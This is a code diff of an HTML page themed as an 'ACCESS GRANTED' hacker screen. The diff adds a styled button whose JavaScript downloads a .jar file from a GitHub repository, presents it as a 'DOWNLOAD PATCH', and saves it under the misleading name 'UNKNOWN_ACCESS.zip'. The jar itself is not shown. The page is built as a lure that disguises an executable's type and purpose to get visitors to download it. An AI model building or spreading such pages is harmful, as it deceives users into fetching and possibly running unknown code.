@@ -1,11 +1,21 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <meta charset="utf-8">
-  <title>ADMIN_OVERRIDE</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>ACCESS GRANTED</title>
   <style>
-    body { background:black; color:#0f0; font-family:monospace; text-align:center; margin-top:15%; }
-    h1 { animation: glitch 0.8s infinite; }
+    body {
+      background-color: black;
+      color: #0f0;
+      font-family: monospace;
+      text-align: center;
+      padding-top: 80px;
+    }
+    h1 {
+      font-size: 48px;
+      animation: glitch 1s infinite;
+    }
     @keyframes glitch {
       0% { text-shadow: 2px 0 red; }
       25% { text-shadow: -2px 0 blue; }
@@ -13,11 +23,38 @@
       75% { text-shadow: -2px 0 blue; }
       100% { text-shadow: 2px 0 red; }
     }
+    button {
+      background: transparent;
+      color: #0f0;
+      border: 2px solid #0f0;
+      padding: 20px 40px;
+      font-size: 20px;
+      cursor: pointer;
+      margin-top: 40px;
+      transition: all 0.2s ease;
+    }
+    button:hover {
+      background: #0f0;
+      color: black;
+      box-shadow: 0 0 20px #0f0;
+    }
   </style>
 </head>
 <body>
   <h1>ACCESS GRANTED</h1>
   <p>Welcome, Administrator.</p>
-  <p><a href="https://github.com/funymaniguess/admin_access/blob/main/file_ujqlpz.jar">[ DOWNLOAD PATCH ]</a></p>
+  <button id="download">[ DOWNLOAD PATCH ]</button>
+
+  <script>
+    document.getElementById("download").addEventListener("click", () => {
+      const link = document.createElement("a");
+      // <-- replace this URL with your actual raw GitHub file link
+      link.href = "https://github.com/funymaniguess/admin_access/blob/main/file_ujqlpz.jar";
+      link.download = "UNKNOWN_ACCESS.zip"; // <-- filename for download
+      document.body.appendChild(link);
+      link.click(); // triggers instant download
+      document.body.removeChild(link);
+    });
+  </script>
 </body>
 </html>
